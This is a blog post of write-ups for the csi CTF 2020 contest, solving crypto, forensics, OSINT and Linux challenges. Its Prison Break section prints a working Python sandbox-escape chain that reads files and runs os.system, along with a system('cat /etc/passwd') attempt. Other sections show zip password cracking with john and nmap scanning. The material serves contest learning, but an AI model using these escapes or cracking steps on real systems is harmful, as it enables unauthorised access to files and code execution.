---
author: george_pick
layout: post
title: "csi CTF 2020"
excerpt: "Writeups for various challenges I solved during the 2020 csi CTF capture the flag competition."
categories: [Capture The Flag]
---

| Crypto | Forensics | Linux | Misc | OSINT |
|--------|-----------|-------|------|-------|
| [Modern Clueless Child](#modern-clueless-child) | [Archenemy](#archenemy) | [HTB 0x1](#htb-0x1) | [Prison Break](#prison-break) | [Commitment](#commitment) |
| [Rivest Shamir Adleman](#rivest-shamir-adleman) | [Gradient Sky](#gradient-sky) | [find32](#find32) | | [Flying Places](#flying-places) |
| [Little RSA](#little-rsa) | [Panda](#panda) | | | [Lo Scampo](#lo-scampo) |
| [Quick Math](#quick-math) | [unseen](#unseen) | | | [Pirates of The Memorial](#pirates-of-the-memorial) |
| [Mein Kampf](#mein-kampf) | | | | [Shaken](#shaken) |
|---

## Team Results

* Place: 40th
* Score: 13797

```
{"id":128,"pos":40,"score":13797,"team":"burner_herz0g"}
```

## Crypto
### Modern Clueless Child
> I was surfing the crimson wave and oh my gosh I was totally bugging. I also tried out the lilac hair trend but it didn't work out. That's not to say you are any better, you are a snob and a half. But let's get back to the main question here- Who am I? (You don't know my name)
>
> Ciphertext = "52f41f58f51f47f57f49f48f5df46f6ef53f43f57f6cf50f6df53f53f40f58f51f6ef42f56f43f41f5ef5cf4e" (hex) Key = "12123"

We're given a plaintext that looks like hex (almost) and a key of unspecified type.

Examining the ciphertext, which they've mentioned is hex, you'll notice `f` occurs inbetween each hex entry:

```
52 f 41 f ...
```

So, I tried removing the space, leaving just

```
52415851475749485d466e5343576c506d53534058516e425643415e5c4e
```

After trying some things in `xortool`, thinking maybe they gave us a junk key, I tried just a repeating key XOR against the ciphertext, and got the flag:

{% highlight python %}
>>> from pwn import xor
>>> from binascii import unhexlify
>>> ct = unhexlify("52415851475749485d466e5343576c506d53534058516e425643415e5c4e")
>>> xor(ct, b"12123")
b'csictf{you_are_a_basic_person}'
{% endhighlight %}

(Note: If you do not convert the flag from hex to bytes, it won't output the flag properly!)

Flag is `csictf{you_are_a_basic_person}`.

### Rivest Shamir Adleman
> These 3 guys encrypted my flag, but they didn't tell me how to decrypt it.

Basic RSA. Like, stupid easy RSA.

Given:

```
n = 408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231
e = 65537
c = 226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909
```

Just update `N`, `e`, and `ct` [in my simple RSA template in python, and run it, since FactorDB is able to factor the given N](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py).

With a little function I made to convert decimal to ascii that I keep in my `~/.zshrc`,

{% highlight bash %}
function decimal_to_ascii(){ local decimal=$1
    echo "obase=16; $decimal" | bc  | xxd -r -p; echo ""
}
{% endhighlight %}

We can get the flag:

```
decimal_to_ascii 49459207073075609387052389022856465595244842985649235071628181272612221410724680024945533
csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}
```

Flag is `csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}`.

### Little RSA
> The flag.zip contains the flag I am looking for but it is password protected. The password is the encrypted message which has to be correctly decrypted so I can useit to open the zip file. I tried using RSA but the zip doesn't open by it. Can you help me get the flag please?

We're given:

* `a.txt`:

    ```
    c=32949
    n=64741
    e=42667
    ```
* `flag.zip`

As challenge prompt says, flag is encrypted. Solve the given RSA `a.txt` constraints to get the password.

Again, stoooopid easy, just plug in to the [RSA template](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py) and get the password for the zip:

{% highlight python %}
python3 normal_rsa.py
N:  64741
e:  42667
factor: 101
factor: 641
d:  3
Plaintext:  18429
{% endhighlight %}

So now just open up the `flag.zip` with `18429` as the password.

Flag is `csictf{gr34t_m1nds_th1nk_4l1ke}`.

### Quick Math
> Ben has encrypted a message with the same value of 'e' for 3 public moduli -  
>   n1 = 86812553978993  
>   n2 = 81744303091421  
>   n3 = 83695120256591  
>  and got the cipher texts -  
>   c1 = 8875674977048  
>   c2 = 70744354709710  
>   c3 = 29146719498409.  
>  Find the original message. (Wrap it with csictf{})

OK - so this is pretty obviously a [Hastad's broadcast attack](https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Hastad-Broadcast).

The one caveat here is _technically_ they didn't give us an `e` value, though, for Hastad's, it is implied that the value for the public exponent is low. I tried brute forcing for any possible value for e from 1 to 100, just to be safe:

I was _this_ close to solving this challenge live, but actually didn't end up getting it in time. Here is a slightly modified version of what I was working on, inspired by [this](https://github.com/noob-atbash/CTF-writeups/blob/d2e7704b26ae3f6214914851347e6f5a1496ab56/csictf-20/crypto/crypto.md#quick-math) writeup by `noob-atbash` (I was mistankenly not treating the given flag as hex... :( ):

{% highlight python %}
#!/usr/bin/env python3
# Hastad broadcast to brute force with potentially unknown e to be safe
from sympy.ntheory.modular import crt
from gmpy2 import iroot

N = [ 86812553978993,81744303091421,83695120256591 ]
ct = [8875674977048,70744354709710, 29146719498409 ]

for e in range(1, 100):
    r, mod = crt(N,ct)
    value, perfect_root = iroot(r, e)
    if perfect_root:
        print(f"e: {e}, value: {value}")
{% endhighlight %}

Which gives us:

```
e: 1, value: 319222184729548122617007524482681344
e: 3, value: 683435743464
```

Converting each of those to hex, we see that when `e: 3` (the expected value for Hastad's ;) ), it decrypts to: `h45t4d`.

Flag is `csictf{h45t4d}`.

### Mein Kampf
> We have intercepted the enemy's communications, but unfortunately, some data was corrupted during transmission. Can you recover the message?

Hell yeah!!! Finally, some real life history!


&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/enigma.webp)
&nbsp;

_*whistles*, Look at that beauty..._

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/enigma_meme.png)
&nbsp;


But seriously, this was a nice challenge, and I can say this is the first Enigma crypto chall I've ever seen, so kudos to these guys for doing something not done frequently.

We're given:

> We have intercepted the enemy's communications, but unfortunately, some data was corrupted during transmission. Can you recover the message?"  
> M4 UKW $ Gamma 2 4 $ 5 9 $ 14 3 $ 5 20 fv cd hu ik es op yl wq jm "Ciphertext: zkrtwvvvnrkulxhoywoj"  
> (Words in the flag are separated by underscores)

Doing some quick googling, it seems that we've gotten some information that's relative to the _Naval 4-wheel Enigma_: [reference](https://www.cryptomuseum.com/crypto/enigma/m4/index.htm) and also [Wikipedia](https://en.wikipedia.org/wiki/Enigma_machine).

This is obvious from the `M4...` that begins with the encryption info.

This is followed by `... UKW $ Gamma …` which is:

> ...The additional 4th wheel was known as Zusatzwalze (extra wheel) or Griechenwalze (Greek wheel), as it was identified with the Greek letter Beta (β) or Gamma (γ)...

So, it seems that we're going to be working with the _Gamma_ form.

Following that, we have a set of numbers, separated by dollar signs. These seem to be the positions and rings at which to set the four motors (Gamma, and the remaining three). However, as the message points out, we've some (key) information: What coding wheels these are actually settings for!

> … It was supplied with 8 different coding wheels, (marked I to VIII), three of which were in the machine at any given time …

All that's left now is a string of letter pairings, that we can assume is the plugboard configuration: `fv cd hu ik es op yl wq jm`: [reference here](https://www.cryptomuseum.com/crypto/enigma/i/sb.htm):

> The Enigma I, Enigma M1, M2, M3 and Enigma M4, are the only models that have a Steckerbrett (plugboard) at the front. The Steckerbrett has 26 sockets that are marked with the letters of the alphabet (A-Z), the numbers 1-26 or both. Each socket accepts a plug with two pins: a thick one and a thin one. The 2-wire cable 1 between two plugs is cross-wired, as a result of which letters are always swapped in pairs. Although this presents a weakness, it was done for good reasons ...

OK - we need to:
1. Find a way to decrypt this using some method or tool
2. Find a way to figure out or brute force the coding wheels

To address (1), [I ended up using a frequently used crypto site, cryptii](https://cryptii.com/pipes/enigma-machine).

Enter in our ciphertext in the box on the left, set the machine to "decode", select the "M4" model, and now we can begin entering our given data. We can fill in the plugboard with our letter pairings, and set Rotor 1 to "Gamma". While we don't know which coding wheels to set the rotors to, we know what position and ring they should be using, so we can set those.

Now, to address (2), we need to try brute forcing all possible coding wheel combinations. I started off with "UKW B thin", and Rotors 2-4 at coding wheel one. I then incremented each rotor in a fashion as to try all combinations in order.

In hindsight, a Python module that has the engima workings coded probably would have been easier to write code to then bruteforce this vs doing it by hand in a GUI, but that is for another time... Eventually, I came across a pairing that resulted in `csictf...` being shown in the plaintext, which was our flag!

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/enigma_mein_kamf.png)
&nbsp;

Flag is `csictf{no_shit_sherlock}`.

## Forensics
### Archenemy
> John likes Arch Linux. What is he hiding?

We're given a photo (which is really a jpg):

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/arched.jpg)
&nbsp;

I use [this awesome forensics/stego container](https://github.com/DominicBreuker/stego-toolkit) so naturally I start with 

```
check_jpg.sh arched.jpg
```

Running so shows that `steghide` was able to extract some hidden data.

```
...
##############################
########## steghide ##########
##############################
wrote extracted data to "flag.zip".
...
```

If we try to open it, we see it has a password, however. Queue up `zip2john` to extract the password hash and then just `john` to crack it and we get the password as `kathmandu`:

```
zip2john flag.zip > ziphash
john --wordlist=rockyou.txt ziphash
```

Opening the file gives us the flag.

Flag is `csictf{1_h0pe_y0u_don't_s33_m3_here}`.

### Gradient Sky
> Gradient sky is a begginer level ctf challenge which is aimed towards rookies.

Use `strings`.

Flag is `csictf{j0ker_w4snt_happy}`.

### Panda
> I wanted to send this file to AJ1479 but I did not want anyone else to see what's inside it, so I protected it with a pin.

We're given a `panda.zip` file that is password protected. Using `zip2john` and then just `john`, we get the password to be `2611`.

Once opened, we get two images of pandas:

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/panda.jpg)
&nbsp;

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/panda1.jpg)
&nbsp;

At first I tried XOR'ing the two images, but that didn't really find anything. `strings` did find what looked to be parts of the flag on one, and on the other, so I thought about subtracting/finding the diff of the two images.

{% highlight bash %}
strings panda.jpg > out1
strings panda1.jpg > out2
diff out1 out2
2c2
< $3br
---
> $csi
89a90
> ctf{
255a257
> kun-
500a503
> Dfu_w
565c568
< i$bI
---
> p4nd4}
{% endhighlight %}

Which, is a bit messy, but gives us the flag.

Flag is `csictf{kung_fu_p4nd4}`

### unseen
> With his dying breath, Prof. Ter Stegen hands us an image and a recording. He tells us that the image is least significant, but is a numerical key to the recording and the recording hides the answer. It may seem as though it's all for nothing, but trust me it's not.
>
>  https://mega.nz/file/cmhnAQDB#9dbHojKcxzliZ5NAYtGBN7N8WHCqtoU7kKa5yuJzG0w  
>  https://mega.nz/file/h75UCIRJ#YGF3yCViKSQpwogmMgkdPQ1DXMez9Sv2DZBUWvCueSY

So, we're given an audio `.wav` file and a picture of a city.

> … the image is least significant, but is a numerical key to the recording ...

Seems to imply that the image might need LSB stego to get some sort of key that we will use in the audio recording.

Running [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve) on the image, we find the pin to be `42845193`.

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/unseen_pin.png)
&nbsp;

The recording sounds like morse, which if you decode is just a red herring. Running `steghide extract -sf morse.wav`, and give it the password from above, we get out a `flag.txt` that is all varying whitespace.

At first, I tried running `stegsnow` on it, and tried with no password/the same password as above/and a bunch of other brute force options. After about 20 minutes, I figured that wasn't the way to go, and started looking elsewhere.

Searching for whitespace stego techniques, I came across this whitespace language interpreter: https://tio.run/#whitespace.

Putting in the flag.txt file, we get the flag!

Flag is `csictf{7h47_15_h0w_y0u_c4n_83c0m3_1nv151813}`.

## Linux

### HTB 0x1
>

So, we get an IP of a box, `34.93.215.188` and a mention that there is a `flag.txt`, likely _somewhere_ on the box.

I don't do [HTB](https://www.hackthebox.eu/) challenges (yet), but a main theme if you look up walkthroughs is that you should start by enumerating any possibly open ports on the given target.

I did so via:

{% highlight bash %}
nmap -sV -sC 34.93.37.238
{% endhighlight %}

Doing so revealed an open FTP server on port 5001, that also even allowed (gasp) Anonymous login!

{% highlight bash %}
...
5001/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jul 14 19:12 pub
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
...
{% endhighlight %}

So, we see there's a directory called `pub` on the server. Initially, I tried connecting to the server and reading the direcoty/server's contents via `dir` and `ls`, etc... but none of those commands worked. It seemed as if I was having issues because the IP of the remote server (which was showing as 10.160.0.2) was causing issues with my ftp commands:

{% highlight bash %}
5001/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 10.160.0.2 is not the same as 34.93.37.238
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:100.40.169.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 9
|      vsFTPd 3.0.3 - secure, fast, stable
{% endhighlight %}

After some reading online, I found that you can also try to use `curl` [to hit a remote FTP endpoint](https://superuser.com/a/265066).

Given the hint in the challenge prompt, I guessed that the flag was at `pub/flag.txt`. I crafter my curl accordingly, and got the flag:

{% highlight bash %}
root@cfb8a4e9ad2c:/# curl ftp://anonymous@34.93.37.238:5001/pub/flag.txt
csictf{4n0nym0u5_ftp_l0g1n}
{% endhighlight %}

A note: `wget` was having the same issues as manually connecting using FTP; I do not know why curl was able to handle it, but that is a lesson for another day.

Flag is `csictf{4n0nym0u5_ftp_l0g1n}`.

### find32
>  I should have really named my files better. I thought I've hidden the flag, now I can't find it myself.
> (Wrap your flag in csictf{})
>
> ssh user1@chall.csivit.com -p 30630  
>  Password is find32

So, going on the box, we see a bunch of weirdly named files:

{% highlight bash %}
$ ls
02KG7GI3  3O7SZPP5  6JJ8M6EQ  99KWRIDG	BUIYBJW6  F9T58X71  IHGA1LHQ  KRTDDSYK	MITS1KT3  OTQLM9FR  RHZ4QIGE  UI3CYXEH	X4O9C3E9
02M95EZJ  3SF18NHO  6KPKMW7F  9EO10QRH	BW90182E  FH0FGQU9  INUIDPFZ  KTE9QN31	MLNCZNJH  OVB0C2DD  RSA9B4XA  UK268DBR	X70F203P
041Q5VQ6  3WJNQHOI  6NZ8YTHN  9KHTQSOG	BZE1NCWY  FI9WZ1NI  ISW6FLPB  KUNZ9OP2	MLRX5NHC  OXNCWNKP  RXHHGT3D  UMVACDSG	XA6HG1VW
0K8HTQUI  3Y6ULSYJ  6O893R7P  9KQEWTD4	C1KDRW2G  FJATAT6I  IUKF08Y4  L25P2X6S	MT0ZF01M  P7U25CJI  RYRXFTD0  UOKCOUPN	XAGJI6C3
0L51GUQ6  40HE4X61  6TQAQ9JL  9KVDBM8O	C5L2LOAA  FMZXZWMD  IW0M1T97  L6RJI5MH	MVYJ08ZU  P7ZSATBS  S3CQF12S  USP8NX9I	XBJ59Z81
0POE7NLS  41W0HO2L  6Y96J42D  9LNZ0ETP	C75ZYB8Q  FOGK2TD9  IXLBEBRX  L97LN1SA	MWE4SJWL  P8H2QJZE  S50ORS2M  UTNI6PSD	XESS84R7
0XC8TJL6  4DXWEUAK  71PCO4II  9MP89P4E	C7LAWJCM  FPLW13DY  IYLAWPCR  L9HIBPO9	N56AGDMY  PBMIEOJ1  S9796BM8  V8A4PPEG	XM6M6XV3
10KS7XSL  4E5VZT6C  74EIPRM5  9QNUXM4L	C9EN38OZ  FUF4GEJ2  IYT9TNZ3  L9NCYUOA	N8O0W1UR  PF2KOY3A  SA13FEFE  VCSYBT6V	XVXM67UN
17HSIYXQ  4FMGJMPX  784MLE5E  9R6FWLZQ	CB7VL2AM  G18VV3XH  J634H910  LA28D194	N9ZX32OP  PJU5YNCE  SGCS15D7  VFFKFKFP	XZ5KZZPR
1DB6A3RZ  4LMTFZCM  79VJFIU5  9SMDHC89	CR8AY5W7  G20VWPOJ  J9K0N1G3  LB4B6X6P	NDR9IE07  PKEIXGTL  SSNMEO7G  VL8QUY6U	Y0WAA0QK
1EBY9SNN  4LYTO0ZG  7EA2V52Y  9TM8NR4D	CVDGAH14  G4DRQMVC  JBNLA5LS  LDMDGEL4	NGT5TVLI  PLE8FFL4  ST1FTYFZ  VOAZ2FLA	Y2F5YYPT
1TE2UPR9  4NE1DLAV  7IKIFVQC  9UGJX4Z2	CYNFLG1O  GBIA0FJJ  JCUBGZ0L  LF6NHZRK	NJJ4FIMD  PM7NRHP0  STYTHKQE  VQHX8Y2S	Y41T1L0P
1VQPZIUO  4O0KVR5P  7JKVQ1V4  9X0BSFFX	D01U0OA5  GCCH7GUL  JD8K3921  LIVI4VP2	NMMNMEDT  PMWQY71J  SWD8ZKVQ  VS2QLP5T	YB6CGUEN
1W6RAWEU  4UOCNFI8  7K2HS4Y8  9YN7B5TM	DC953402  GGK14ZEP  JDVT05Q1  LKLQLQ8B	NNGY3F51  PN7VNWMY  SXRZ25DU  VS5RKUTC	YGAD81HL
21X763CW  4VTQDZXG  7O0E74NI  A202VRDJ	DHI6XKWG  GN72VYNY  JL8V5YGI  LKUM0ZLZ	NQ3BFZKH  PRIT98R2  T0ST0WFT  VU7UXE91	YI5ISTTI
24CHFLCM  526KAB1Q  7QQAKH41  A8DWWULS	DQZAE7MY  GVAUVIPU  JM035B27  LP29J6MU	NTIJFZDS  PUKTT71A  T5D06H6O  VUU3IP28	YI9VPU71
24UQMOA7  5669QKVZ  7UB67288  A9ARPBTE	DVRULQ4L  GVTHMJMC  JMXU733Y  LQWDHMT1	NWAG08DF  PX7XX8MV  THW3C7CC  VWXNPY8W	YJ4H3LH9
2FFS4207  5714I59N  7UYWYDBZ  AK1L1RB0	E2DCKTAW  H782K0GF  JNTGVLSL  LR9H9RJ4	NXH2E4FB  PXR9X9H1  TIE17JV7  VYXH92ZI	YJPL7KY5
2L9WVOQA  5D8MSKXV  80TD6MQ1  AK6PZX3H	E2WWNK1U  H7PWE6D1  JQJIA3QC  LS1E6E8N	O08K936H  Q3VV2P04  TNGM39LQ  W569XUGK	YLTYQ7PT
2MMNROKS  5DNAUH8Z  82R7NE45  AL2HOE1I	E3VMO1UV  HI1HXC9E  JSWT0A61  M0ODDGTQ	O20W8JF2  QBZ2NYYY  TNNLXAMK  W56UYZUK	YZOFT123
2X82259Q  5DY1KZDZ  84XR0NUK  ATP6Z1LV	EBGAB2T7  HJ7SLXWJ  JW5DHBI2  M2D9A9GW	O8C1K8CS  QDDZKQBI  TOD5ZOWV  W7N3EQ8A	Z8TPG2SQ
31H6U39X  5E0OD9MJ  89JKXHMI  AYHI7FZG	EDL1IX5Y  HKX85U5A  JYP14B13  M2W3FH21	OA9OWQNN  QDZM9GU3  TP72DLYC  W8XHJP69	ZE0LYP1J
32DJSRCD  5FOOLY10  8AYM8OQ9  AZBQ6DI4	EJKM4P8J  HL9OQ59W  K5HIYP7U  M40WA6L0	OAVKKSIU  QON3WELD  TQYI4JH2  WFLCEXOU	ZIIFJZRE
36VMK9BG  5HQTP051  8BHHDOCA  AZF6YNNW	EMAPY1SV  HTFON23U  K7H88QI2  M45WG887	OB0TZRYT  QV763DK6  TY2N5W2V  WHYUOJS2	ZKOYMDBL
3B2F652L  5OWRFEZT  8DCJBGN8  BAL0FX4Y	EMOTUDML  HW9ZGUI0  K80WPMFB  M4PSP87C	OHGWT0IT  QXKDIR8P  TZ4TM4KC  WO7DKKIR	ZOM1L6RA
3C71HLAH  5S7QF3H6  8O23G30S  BDMSPZFU	EPIGX1NO  HWR8ILW8  K8670JAD  M50MK22L	OI290XGJ  QYBFIDQA  U1HE6HJU  WQYZVZ02	ZUIZ3BRS
3CWSG1VM  5ZCQW7TK  8Q8IDTC7  BDYM2DL3	EUXTE3IX  I0GJ1ZT2  KDT49C2O  M6MO9M1W	OJTT5YOZ  QYKLAVOR  U1Z144SU  WW5L7JNK	ZXWG1CJB
3E7ZTAVL  66SLWGGM  8SQP2JFV  BH13PMF2	EXVHNHYF  I0HK3F0Q  KJ26BDR0  M8XE7P73	OLHQ2XMI  QZBKI0LI  U4CT6S3M  WXW4GEDU	ZYSF9F0A
3FSO4YLX  6IGISUOK  90ORMN66  BP1QOD2S	EYN874N3  I3QH2SGS  KOIIQDDB  MAC4PGYS	OM4BZRJ6  R3O1QJRE  U9KXZUZT  X1SVRUTM
3MPI6ZGG  6IS45I48  931P2T2C  BRKQC7KI	F4K726ZE  I7BE5SNQ  KQFVQJ3J  MDZE1NQC	OO08I86R  R513RF7X  UFF3VJES  X23268R9
3NI0KD8T  6JFHFM48  95NBR36B  BT4Q0KSC	F5FFWSP3  I7BYYSUH  KRNKFQTK  MIN0CJNB	OPTKWTEN  R75LDKZA  UFRWO7LV  X44EBTIV
{% endhighlight %}

I did a `grep` to try to see if any of them had `csi` in it, and it turns out that `./MITS1KT3` does:

```
...
...3ITZVTHBQM9J9OWVX8csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}WOQS75G7TVPTTN3RBXGK96HGINKCRZ1Z8JP6N44KC02C9E8..
...
```

So, we find "not the flag", but more importantly, some info for a new user, user2.

If we try to switch to user2 using `AAE976A5232713355D58584CFE5A5` as the password, we are successful:

{% highlight bash %}
$ su - user2
Password:
$ ls
adgsfdgasf.d  fadf.x  janfjdkn.txt  notflag.txt  sadsas.tx
$ whoami
user2
{% endhighlight %}

Visually inspecting those files, they're huge, and all seem the same. Doing a cat+grep/etc for the flag doesn't yield any result either.

I tried comparing the files, and found the flag when you comparing `sadsas.txt` against any of the files:

{% highlight bash %}
$ diff sadsas.tx notflag.txt
42392d42391
< th15_15_unu5u41
{% endhighlight %}

Flag is `csictf{th15_15_unu5u41}`.

## Misc
### Prison Break
> I saw them put someone in jail. Can you find out who it is?  
> They said this is the best prison ever built. You sure can't break it, can you?
>
> nc chall.csivit.com 30407

We land in what looks to be a Python jail (based on the `>>> ` prompt).

Running something like:

```
Find the flag.
>>> print "lololol old"
lololol old
```

Seems to indicate that we're working in a Python2.X jail.

After some researching I came across [this post on a plaidCTF jail escape](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html). Go read that writeup on the details of what to look for and what's being done. Seriously, it's really well written and all that I know would be mostly just a regurgitation of that, so... go look at that.

In short, we've been stripped of some functions and builtins:

{% highlight python %}
>>> __import__('os')
You have encountered an error.
>>> execfile('/usr/lib/python2.7/os.py')
You have encountered an error.
>>> system('cat /etc/passwd')
You have encountered an error.
>>> system('ls')
You have encountered an error.
{% endhighlight %}

However, `print(__builtins__.__dict__)` shows us:

{% highlight python %}
>>> print(__builtins__.__dict__)
{'bytearray': <type 'bytearray'>, 'help': Type help() for interactive help, or help(object) for help about object., 'dict': <type 'dict'>, 'bin': <built-in function bin>, 'False': False, 'dir': <built-in function dir>, 'bytes': <type 'str'>, 'abs': <built-in function abs>, 'True': True, 'None': None, 'basestring': <type 'basestring'>, 'Exception': <type 'exceptions.Exception'>, 'ArithmeticError': <type 'exceptions.ArithmeticError'>, 'complex': <type 'complex'>, 'AssertionError': <type 'exceptions.AssertionError'>, 'AttributeError': <type 'exceptions.AttributeError'>}
>>> print(dir(__builtins__))
['ArithmeticError', 'AssertionError', 'AttributeError', 'Exception', 'False', 'None', 'True', 'abs', 'basestring', 'bin', 'bytearray', 'bytes', 'complex', 'dict', 'dir', 'help']
{% endhighlight %}

If we get an instance of a `()` class, and exploit the fact that we can potentially get a useful subclass out of it, we are able to perform file reads like so (again, go read that writeup...):

{% highlight python %}
>>> print(().__class__.__bases__[0].__subclasses__()[40]('flag.txt', 'r').read())
The flag is in the source code.
{% endhighlight %}

Dicks. So, we need to find the source code. To do so, I resorted to finding a way to be able to do a `ls` in the current directory, taking advantage of the fact that `linecache` from `catch_warnings` imports `os`:

{% highlight python%}
>>> print(().__class__.__bases__[0].__subclasses__()[59].__repr__.im_func.func_globals["linecache"].__dict__['os'].__dict__['system']('ls'))

>>> print(().__class__.__bases__[0].__subclasses__()[59].__repr__.im_func.func_globals["linecache"].__dict__['os'].__dict__['system']('ls'))
flag.txt
jail.py
start.sh
0
{% endhighlight %}

Sick!! So `jail.py` looks like what we want! Updating our file read command from before, but now reading `jail.py`:

{% highlight python %}
>>> print(().__class__.__bases__[0].__subclasses__()[40]('jail.py', 'r').read())
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
{% endhighlight %}

Flag is `csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}`.

## OSINT
Ooooooooooweeeee boys, we blooded all the original OSINT's in less than like 2 minutes >:)

### Commitment
> hoshimaseok is up to no good. Track him down.

Search on github for `hoshimaseok`. Find [SomethingFishy](https://github.com/hoshimaseok/SomethingFishy). Inspect the `dev` branch. Inspect the commits and find the flag.

Flag is `csictf{sc4r3d_0f_c0mm1tm3nt}`.

### Flying Places
> A reporter wanted to know where this flight is headed. Where does he (the reporter) live?

We're given a picture of a flight (for Alibaba's Jack Ma):

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/flying.jpg)
&nbsp;

Leads us to "chinese billionaire ships 500000 coronavirus testing kits".

Which leads us to his Twitter posting about it [here](https://twitter.com/jackma/status/1239388330405449728?lang=en).

One of the comments is: https://twitter.com/svqjournalist/status/1239392709841833985, which his bio shows he's from the Bay Area, San Francisco.

Flag is `csictf{san_francisco}`.

### Lo Scampo
> Malcolm X took Broiestevane to a Day of the Dead themed party but she never returned. Her only friends, Mr Bean and the Pink Panther realised that she was missing when she didn't show up for an exam. Broiestevane liked posting pictures, where was the party held?  
> (Don't forget to wrap your answer in csictf{})'

Going to https://www.instagram.com/Broiestevane/ we see another link in the bio for:

> I cant believe I missed my exam for this party: www.instagram.com/p/B3pJE1CgMvI

Navigating to that instagram page, we see it's for a **Liberty Boston** hotel, which is posting about

> Tickets on sale now for our ‘DAY OF THE DEAD’ Halloween costume party - Boston’s largest Halloween event! Ticket link in our bio...grab your tickets before they sell out 💀

Flag is `csictf{liberty_hotel}`.

### Pirates of the Memorial
> The original photographer of this picture commented the flag on his post. Find the flag.

We get an image:

&nbsp;
![]({{ site.baseurl }}/img/csiCTF2020/storm.jpeg)
&nbsp;

Looking that up on Google images, we find it's a picture of Victoria Memorial in Kolkata.

In the results, we find a link to a twitter posting at https://twitter.com/rishibagree/status/1016932954143158274?lang=en.

In there, one of the comment threads is:

> who take this pic  
> ...  
> Arunopal Banerjee not this guy

Looking that person up, we find his instagram at https://www.instagram.com/arunopal17/?hl=en. Looking through the comments on the original image, we get the flag.

Flag is `csictf{pl4g14r1sm_1s_b4d}`.

### Shaken
> I love this watch. It's been with me all over the world, from Istanbul to Shanghai to Macau.I wear it with suits quite a lot. My boss liked it too. I remember wearing it when she died. What is her successor's name?

Searching for watch and the mentioned locations, we get references to "Skyfall", the James Bond movie. Gien the "wearing suits with it a lot", it seems like they're refrencing James Bond's watch after all.

"My Boss" would therefore be "M". Searching up "M" on the James Bond Fandom wiki, we find [this page](https://jamesbond.fandom.com/wiki/M_(Ralph_Fiennes)) which states:

> … At the end of the film, due to her death, Mallory is given M's alias and position as head of MI6.

Flag is `csictf{gareth_mallory}`.
